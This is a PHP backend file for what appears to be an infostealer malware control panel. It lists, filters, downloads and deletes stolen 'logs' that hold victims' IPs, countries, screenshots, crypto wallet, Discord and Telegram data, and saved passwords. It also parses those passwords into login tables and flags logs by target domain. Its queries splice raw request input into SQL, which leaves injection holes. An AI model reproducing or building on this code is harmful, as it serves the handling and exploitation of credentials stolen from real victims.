<?php
require '../../db.php';
//////////////////////Functions switcher

switch (trim($_POST['func'])) {
	case "logssearch":
		logssearch();
		break;
	case "logssearchload":
		logssearchload();
		break;
	case "savenote":
		savenote();
		break;
	case "deletelog":
		deletelog();
		break;
	case "deletelogs":
		deletelogs();
		break;
	case "modalpwds":
		modalpwds();
		break;
}

//////////////////////Logs search sql generator

function logssearch()
{


	$page = intval($_POST['page']);
	$prew = (intval($page) - 1);
	$mult = 20;

	$logsreturn = logssearchdb(null);
	$logs = $logsreturn[0];
	$rows = $logsreturn[1];
	$sort = $logsreturn[2];		
	
	//////////////////////HTML Generator


	$html = "";
	$settings = R::load('settings', 1);
	
	$html .= '	<div class="col-12 d-flex justify-content-end">
					<div class="font-weight text-info font-size-lg mb-0">FOUND '.$rows.'/'.R::count('log').' LOGS</div>
				</div>	
				<div class="col-12 d-flex justify-content-end">

						<ul class="pagination pagination-sm  mt-4" style="cursor: pointer;">';
							if ($prew !=0)
							{
								$html .= '<li class="page-item"><a id="1" class="btn-page page-link" >First</a></li>';								
								if ($prew > 1)
								{
									$html .= '<li class="page-item"><a id="'.($page - 2).'" class="btn-page page-link" >'.($page - 2).'</a></li>';
								}
								$html .= '<li class="page-item"><a id="'.($page -1).'" class="btn-page page-link">'.($page -1).'</a></li>';
							}
							$html .= '<li class="page-item active"><a id="'.$page.'" class="btn-page page-link">'.$page.'</a></li>';
							if ($page < (intdiv($rows,$mult)+1))
							{
								$html .= '<li class="page-item"><a id="'.($page + 1).'" class="btn-page page-link">'.($page + 1).'</a></li>';
								if ($page < (intdiv($rows,$mult)))
								{
									$html .= '<li class="page-item"><a id="'.($page + 2).'" class="btn-page page-link">'.($page + 2).'</a></li>';
									$html .= '<li class="page-item"><a id="'.(intdiv($rows,$mult)+1).'" class="btn-page page-link">Last</a></li>';
								}
							}

						$html .= '</ul>
					</div>
					<table class="table dt-responsive nowrap" style="border-collapse: collapse; border-spacing: 0; width: 100%;">
						<thead>					
							<tr>
								<th style="width: 50px;">
									ID
								</th>
								
								<th style="width: 30px;">
								
								<div class="custom-control custom-checkbox">
										<input type="checkbox" class="btn-select-all custom-control-input" id="customChecks" data-parsley-multiple="groups" data-parsley-mincheck="2">
										<label class="custom-control-label" for="customChecks"></label>
									</div>
								</th>';
								if($settings["logs_comment"] == "1")
								{
									$html .= '<th style="width: 200px;">Comment</th>';
								}
								if($settings["logs_data"] == "1")
								{
									$html .= '<th style="width: 320px;">Data</th>';
								}
								if($settings["logs_marker"] == "1")
								{
									$html .= '<th style="width: 180px;">Marker</th>';
								}
								if($settings["logs_ip"] == "1")
								{
									$html .= '<th>IP</th>';
								}
								if($settings["logs_screenshot"] == "1")
								{
									$html .= '<th >Screenshot</th>';
								}
								if($settings["logs_actions"] == "1")
								{
									$html .= '<th style="width: 115px;">Actions</th>';
								}
								if($settings["logs_date"] == "1")
								{
									if($sort == "DESC")
									{
										$html .= '<th id="sort_date" sort="DESC" style="width: 200px; cursor: pointer;" data-toggle="tooltip" data-placement="top" title="Sorted by date">
												Date
												<svg width="16" height="16" fill="currentColor" class="bi bi-arrow-down-short" viewBox="0 0 16 16">
													<path fill-rule="evenodd" d="M8 4a.5.5 0 0 1 .5.5v5.793l2.146-2.147a.5.5 0 0 1 .708.708l-3 3a.5.5 0 0 1-.708 0l-3-3a.5.5 0 1 1 .708-.708L7.5 10.293V4.5A.5.5 0 0 1 8 4z"/>
												</svg>
											</th>';
									}
									else if ($sort == "ASC")
									{
										$html .= '<th id="sort_date" sort="ASC" style="width: 200px; cursor: pointer;" data-toggle="tooltip" data-placement="top" title="Sorted by date">
												Date
												<svg width="16" height="16" fill="currentColor" class="bi bi-arrow-up-short" viewBox="0 0 16 16">
												    <path fill-rule="evenodd" d="M8 12a.5.5 0 0 0 .5-.5V5.707l2.146 2.147a.5.5 0 0 0 .708-.708l-3-3a.5.5 0 0 0-.708 0l-3 3a.5.5 0 1 0 .708.708L7.5 5.707V11.5a.5.5 0 0 0 .5.5z"/>
												</svg>
											</th>';
									}
								}
								$html .='								
							</tr>
						</thead>


						<tbody>';
	
	
		foreach($logs as $log) {
		$html .= '<tr id = ' . $log["id"] . '>
								<td class="font-weight-bolder font-size-lg mb-0">' . $log["id"] . '</td>
								<td>
									<div class="custom-control custom-checkbox">
										<input type="checkbox" class="check-rows custom-control-input" id="customCheck' . $log["id"] . '" file_name="'.$log["path"].'" link_to_download="'.$GLOBALS['logspath'].'/'.$log["path"].'" data-parsley-multiple="groups" data-parsley-mincheck="2">
										<label class="custom-control-label" for="customCheck' . $log["id"] . '"></label>
									</div>
								</td>';
								if($settings["logs_comment"] == "1")
								{
									$html .= '
									<td>
										<div class="input-group">
											<textarea class="form-control" rows="1" style="margin-top: 0px; margin-bottom: 0px; width: 80px;">'.$log["note"].'</textarea>
											<span class="">
												<button class="btn_saveNote btn btn-outline-success btn-sm" type="button">
													<svg width="24" height="24" 
														viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
														stroke-linecap="round" stroke-linejoin="round" class="feather feather-save" 
														style="width:20px;">
															<path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path>
															<polyline points="17 21 17 13 7 13 7 21"></polyline>
															<polyline points="7 3 7 8 15 8"></polyline>
													</svg>
												</button>
											</span>
										</div>
									</td>';
								}
								if($settings["logs_data"] == "1")
								{
									$html .= '
									<td class="text-center">
								
									<button  class="btn btn-sm btn-outline-warning" style="height: 31px;">
										<b>&#8383;</b>';
										if ($log["count_crpt"]>0)
										{
											$html .= $log["count_crpt"];
										}
										else
										{
											$html .= '0';
										}
											
									$html .= '</button>
									<button  class="btn btn-sm btn-outline-warning" style="height: 31px;">
										<b>🧩</b>';
										if ($log["count_plugins"]>0)
										{
											$html .= $log["count_plugins"];
										}
										else
										{
											$html .= '0';
										}
									$html .= '</button>
									<button  class="btn btn-sm btn-outline-warning" style="height: 31px;">
										<b><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-discord" viewBox="0 0 16 16">
										<path d="M6.552 6.712c-.456 0-.816.4-.816.888s.368.888.816.888c.456 0 .816-.4.816-.888.008-.488-.36-.888-.816-.888zm2.92 0c-.456 0-.816.4-.816.888s.368.888.816.888c.456 0 .816-.4.816-.888s-.36-.888-.816-.888z"/>
										<path d="M13.36 0H2.64C1.736 0 1 .736 1 1.648v10.816c0 .912.736 1.648 1.64 1.648h9.072l-.424-1.48 1.024.952.968.896L15 16V1.648C15 .736 14.264 0 13.36 0zm-3.088 10.448s-.288-.344-.528-.648c1.048-.296 1.448-.952 1.448-.952-.328.216-.64.368-.92.472-.4.168-.784.28-1.16.344a5.604 5.604 0 0 1-2.072-.008 6.716 6.716 0 0 1-1.176-.344 4.688 4.688 0 0 1-.584-.272c-.024-.016-.048-.024-.072-.04-.016-.008-.024-.016-.032-.024-.144-.08-.224-.136-.224-.136s.384.64 1.4.944c-.24.304-.536.664-.536.664-1.768-.056-2.44-1.216-2.44-1.216 0-2.576 1.152-4.664 1.152-4.664 1.152-.864 2.248-.84 2.248-.84l.08.096c-1.44.416-2.104 1.048-2.104 1.048s.176-.096.472-.232c.856-.376 1.536-.48 1.816-.504.048-.008.088-.016.136-.016a6.521 6.521 0 0 1 4.024.752s-.632-.6-1.992-1.016l.112-.128s1.096-.024 2.248.84c0 0 1.152 2.088 1.152 4.664 0 0-.68 1.16-2.448 1.216z"/>
										</svg></b>';
										if ($log["count_discord"]>0)
										{
											$html .= $log["count_discord"];
										}
										else
										{
											$html .= '0';
										}
									$html .= '</button>
									<button  class="btn btn-sm btn-outline-warning" style="height: 31px;">
										<b><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-telegram" viewBox="0 0 16 16">
										<path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8.287 5.906c-.778.324-2.334.994-4.666 2.01-.378.15-.577.298-.595.442-.03.243.275.339.69.47l.175.055c.408.133.958.288 1.243.294.26.006.549-.1.868-.32 2.179-1.471 3.304-2.214 3.374-2.23.05-.012.12-.026.166.016.047.041.042.12.037.141-.03.129-1.227 1.241-1.846 1.817-.193.18-.33.307-.358.336a8.154 8.154 0 0 1-.188.186c-.38.366-.664.64.015 1.088.327.216.589.393.85.571.284.194.568.387.936.629.093.06.183.125.27.187.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.426 1.426 0 0 0-.013-.315.337.337 0 0 0-.114-.217.526.526 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09z"/>
										</svg></b>';
										if ($log["count_telegram"]>0)
										{
											$html .= $log["count_telegram"];
										}
										else
										{
											$html .= '0';
										}
										$html .= '</button>
										<button type="button" class="btn btn-modalcl btn-sm btn-outline-primary" style="height: 31px;" >
									<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
										viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
										stroke-linecap="round" stroke-linejoin="round" class="feather feather-key" 
										style="width:12px;">
											<path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
									</svg> 
									'.$log["count_pwds"].'
								</button>
									<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="my-modal-'.$log["id"].'" aria-hidden="true">
										<div class="modal-dialog modal-xl" role="document">
											<div class="modal-content">
												<div class="modal-header">
													<h6 class="modal-title m-0" id="my-modal-'.$log["id"].'">Saved password</h6>
													<button type="button" class="close "  data-dismiss="modal" aria-label="Close">
														<span aria-hidden="true"><i data-feather="arrow-right"></i></span>
													</button>
												</div>
												<!--end modal-header-->
												<div class="modal-body">

													<div class="table-responsive">
														<table class="table table-hover mb-0">
															<thead>
																<tr>
																	<th>Soft</th>
																	<th>Profile</th>
																	<th>Domain</th>
																	<th>Login</th>
																	<th>Password</th>
																</tr>
															</thead>
															<tbody id="onetwo">
																
															</tbody>
														</table>
														<!--end /table-->
													</div>
												</div>
												<!--end modal-body-->
												<div class="modal-footer">
													<button type="button" class="btn btn-secondary btn-sm" data-dismiss="modal">Close</button>
												</div>
												<!--end modal-footer-->
											</div>
											<!--end modal-content-->
										</div>
										<!--end modal-dialog-->
									</div>
									<!--end modal-->

								</td>';
								}
								if($settings["logs_marker"] == "1")
								{
									$html .= '
									<td>';
									$markers = R::find('markerrule', 'is_active = ?', ["1"]);

									$passwords = nl2br($log["text_pwds"]);

									foreach (array_reverse($markers, true) as $marker) {
										$_markers = explode(',', $marker["marker"]);
										foreach ($_markers as $_marker)
										{
											$pos = stripos($passwords, $_marker);

											if ($pos !== false) 
											{
												$html .= '<span style="color: ' . $marker["color"] . '">' . $_marker . ' </span>';
											}
										}
										
									}

									$html .= '</td>';
								}
								if($settings["logs_ip"] == "1")
								{
									$html .= '
									<td >
										<div class="font-weight-bolder font-size-lg mb-0">'.$log["ip"].'</div>
										<div class="font-weight-bold text-muted d-flex align-items-center">Code: <span class="mx-2">
											<img src="assets/images/flags/'.strtolower($log["country"]).'.png" alt="" />
										</span>'.$log["country"].'</div>
									</td>';
								}
								if($settings["logs_screenshot"] == "1")
								{
									$html .= '
									<td class="text-center">
										<div style="width: 100px; display: block; margin-left: auto; margin-right: auto; cursor: pointer;" class="btn-modalscr card card-custom  mb-5 mb-lg-0" path="'.$GLOBALS['logspath'].'/'.$log["path"].'">
											<img src="view.php?path='.$GLOBALS['logspath'].'/'.$log["path"].'" width="100%" >			
										</div>
									</td>';
								}
								if($settings["logs_actions"] == "1")
								{
									$html .= '
									<td class="text-center">
									<a href="./'.$GLOBALS['logspath'].'/'.$log["path"].'" type="button" class=" btn btn-sm btn-outline-info waves-effect waves-light  mr-1"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-download" viewBox="0 0 16 16">
										<path d="M.5 9.9a.5.5 0 0 1 .5.5v2.5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-2.5a.5.5 0 0 1 1 0v2.5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2v-2.5a.5.5 0 0 1 .5-.5z"/>
										<path d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"/>
										</svg></a>
																			<button type="button" class="btn-deleteLog btn btn-sm btn-outline-danger waves-effect waves-light"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16">
										<path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/>
										<path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/>
										</svg></button>
									</td>';
								}
								if($settings["logs_date"] == "1")
								{
									$html .= '
									<td>
										<div class="font-weight-bolder text-dark mb-0">';
										$startTime = new Datetime($log["add_date"]);
									  $endTime = new DateTime();
									  
									  $diff = date_diff($endTime, $startTime);
									  if($diff->format('%y') > 0) $html .= $diff->format('%m')."y ";
									  if($diff->format('%m') > 0) $html .= $diff->format('%m')."m ";
									  if($diff->format('%d') > 0) $html .= $diff->format('%d')."d ";
									  if($diff->format('%H') > 0) $html .= $diff->format('%H')."h ";
									  if($diff->format('%i') > 0) $html .= $diff->format('%i')."m ";
									  if($diff->format('%s') > 0) $html .= $diff->format('%s')."s";
										$html .= ' ago</div>
										<div class="font-weight-bolder text-muted mb-0">'.$log["add_date"].'</div>
									</td>';
								}
							
					$html.='
					</tr>
</tr>';
	}
	$html .= '</tbody>
			</table>';
	
	$html .= '<div class="col-12 d-flex justify-content-end">
						<ul class="pagination pagination-sm  mt-4" style="cursor: pointer;">';
							if ($prew !=0)
							{
								$html .= '<li class="page-item"><a id="1" class="btn-page page-link" >First</a></li>';								
								if ($prew > 1)
								{
									$html .= '<li class="page-item"><a id="'.($page - 2).'" class="btn-page page-link" >'.($page - 2).'</a></li>';
								}
								$html .= '<li class="page-item"><a id="'.($page -1).'" class="btn-page page-link">'.($page -1).'</a></li>';
							}
							$html .= '<li class="page-item active"><a id="'.$page.'" class="btn-page page-link">'.$page.'</a></li>';
							if ($page < (intdiv($rows,$mult)+1))
							{
								$html .= '<li class="page-item"><a id="'.($page + 1).'" class="btn-page page-link">'.($page + 1).'</a></li>';
								if ($page < (intdiv($rows,$mult)))
								{
									$html .= '<li class="page-item"><a id="'.($page + 2).'" class="btn-page page-link">'.($page + 2).'</a></li>';
									$html .= '<li class="page-item"><a id="'.(intdiv($rows,$mult)+1).'" class="btn-page page-link">Last</a></li>';
								}
							}

						$html .= '</ul>
					</div>';

	

	echo json_encode($html);
}

//////////////////////logssearch load

function logssearchload()
{
	
	$logsreturn = logssearchdb("download");
	$mass = array();
	foreach($logsreturn[0] as $log)
	{
		$mass[$log["path"]] = $GLOBALS['logspath'].'/'.$log["path"];			
	}
	echo json_encode($mass);
}

//////////////////////logssearch in db

function logssearchdb($param)
{
	$where = "";
	if (!empty($_POST['id'])) $where		.= " AND UPPER(id) LIKE UPPER('%" . trim($_POST['id'] . "%')");
	if (!empty($_POST['ip'])) $where		.= " AND ip LIKE '%" . trim($_POST['ip']) . "%'";
	if (!empty($_POST['country']))
	{
		$sqlcountry = " AND (UPPER(country) LIKE UPPER('test'))";
		foreach ($_POST['country'] as $country)
		{
			$sqlcountry .= " OR (UPPER(country) LIKE UPPER('%". $country."%'))";
		}

		$where .= $sqlcountry;
	}
	if (!empty($_POST['tag']))
	{
		$sqltag = " AND (UPPER(tag) LIKE UPPER('test'))";
		foreach ($_POST['tag'] as $tag)
		{
			$sqltag .= " OR (UPPER(tag) LIKE UPPER('%". $tag."%'))";
		}

		$where .= $sqltag;
	}
	if (!empty($_POST['marker']))
	{
		$sqlmarker = " AND (UPPER(tag) LIKE UPPER('_________'))";
		foreach ($_POST['marker'] as $marker)
		{
			$goodMarkers = R::find('markerrule', 'name = ?', [$marker]);
			$_markers = explode(',', $goodMarkers["marker"]);
			
			foreach ($_markers as $_marker)
			{
				$sqlmarker .= " OR (UPPER(text_pwds) LIKE UPPER('%". $_marker."%'))";
			}
		}
		$where .= $sqlmarker;
		
	}
	if (!empty($_POST['note'])) $where		.= " AND UPPER(note) LIKE UPPER('%" . trim($_POST['note'] . "%')");
	if (!empty($_POST['pwd'])) $where		.= " AND UPPER(text_pwds) LIKE UPPER('%" . trim($_POST['pwd'] . "%')");
	if (!empty($_POST['system'])) $where	.= " AND UPPER(text_sys) LIKE UPPER('%" . trim($_POST['system'] . "%')");
	if (!empty($_POST['date'])) {
		$dates = explode(" - ", $_POST['date']);
		$date1 = date("Y-m-d H:i:s", strtotime($dates[0] . " 00:00:00"));
		$date2 = date("Y-m-d H:i:s", strtotime($dates[1] . " 23:59:59"));
		$where .= " AND add_date BETWEEN '" . $date1 . "' AND '" . $date2 . "'";
	}
	if ($_POST['empty'] == 'true') $where	.= " AND count_pwds>0";
	if ($_POST['crpt'] == 'true') $where	.= " AND count_crpt>0";
	if ($_POST['telegram'] == 'true') $where	.= " AND count_telegram>0";
	if ($_POST['discord'] == 'true') $where	.= " AND count_discord>0";
	if ($_POST['exts'] == 'true') $where	.= " AND count_plugins>0";
	if ($_POST['unique'] == 'true') $where	.= " AND dublicate = 0";
	
	$sort = "DESC";
	if (!empty($_POST['sorted']))
	{
		if ($_POST['sorted'] == "DESC")
		{
			$sort = "ASC";
		}
		else if ($_POST['sorted'] == "ASC")
		{
			$sort = "DESC";
		}
	}
	

	if($param == "download")
	{
		$sql = "SELECT * FROM log WHERE 1=1" . ($where ? $where : "");
	}
	else
	{
		$page = intval($_POST['page']);
		$prew = (intval($page) - 1);
		$mult = 20;
		$sql = "SELECT * FROM log WHERE 1=1" . ($where ? $where : "") . " ORDER BY id ".$sort." LIMIT ".$prew * $mult.", ".$mult;
	}
	$rows = R::getAll($sql);
	$sqlCount = "SELECT COUNT(*) FROM log WHERE 1=1" . ($where ? $where : "");
	$_count = R::getRow($sqlCount);
	$count = $_count['COUNT(*)'];
	
	$ret = array($rows, $count, $sort);
	
	
	return [$rows, $count, $sort];
}

//////////////////////Save note

function savenote()
{
	$log = R::load('log', $_POST['id']);
	$log->note = trim($_POST['note']);
	R::store($log);
	echo 'note add';
}

//////////////////////Delete log

function deletelog()
{
	$log = R::load('log', $_POST['id']);
	R::trash($log);
	echo $result = "deleted";
}

//////////////////////Delete logs

function deletelogs()
{
	foreach ($_POST['ids'] as $key => $id) {
		$log = R::load('log', $id);
		R::trash($log);
	}
	echo $result = json_encode($_POST['ids']);
}

//////////////////////Generate modal with pwds

function modalpwds()
{
	$log = R::load('log', $_POST['id']);
	$pwds = $log['text_pwds'];
	$working = explode("\n", $pwds);
	$i = 0;
	$mass = array();
	foreach ($working as $line) {
		$row = substr($line, 0, 4);
		$param = substr($line, 6);
					
		switch ($row) {
			case "SOFT":
				$mass[$i] = array("SOFT" => $param);
				break;

			case "PROF":
				$mass[$i] += array("PROF" => $param);
				break;

			case "HOST":
				$mass[$i] += array("HOST" => $param);
				break;

			case "USER":
				$mass[$i] += array("USER" => $param);
				break;

			case "PASS":
				$mass[$i] += array("PASS" => $param);
				break;
			case "":
				$i++;
				break;
		}
		
		
	}
	echo json_encode($mass);
}




?>